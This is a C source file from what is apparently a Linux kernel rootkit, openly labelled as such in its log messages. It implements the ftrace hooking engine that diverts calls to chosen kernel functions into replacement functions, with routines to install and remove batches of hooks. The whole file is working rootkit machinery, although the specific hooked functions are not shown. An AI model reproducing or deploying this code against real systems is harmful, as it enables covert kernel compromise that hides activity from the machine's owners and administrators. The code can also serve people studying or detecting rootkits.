#include "hooking.h"
#include "ksym.h"
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                 struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (unsigned long)hook->function;
    }
}

static int resolve_hook_addr(struct ftrace_hook *hook) {
    hook->address = ksym_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rootkit: symbol %s not found\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;
    return 0;
}

int install_hook(struct ftrace_hook *hook) {
    int err;

    err = resolve_hook_addr(hook);
    if (err)
        return err;

    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("rootkit: ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("rootkit: register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    }

    return err;
}

int install_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;
    int err;

    for (i = 0; i < count; i++) {
        err = install_hook(&hooks[i]);
        if (err) {
            while (i > 0) {
                remove_hook(&hooks[--i]);
            }
            return err;
        }
    }

    return 0;
}

void remove_hook(struct ftrace_hook *hook) {
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("rootkit: unregister_ftrace_function failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) {
        pr_debug("rootkit: ftrace_set_filter_ip failed: %d\n", err);
    }
}

void remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++) {
        remove_hook(&hooks[i]);
    }
}
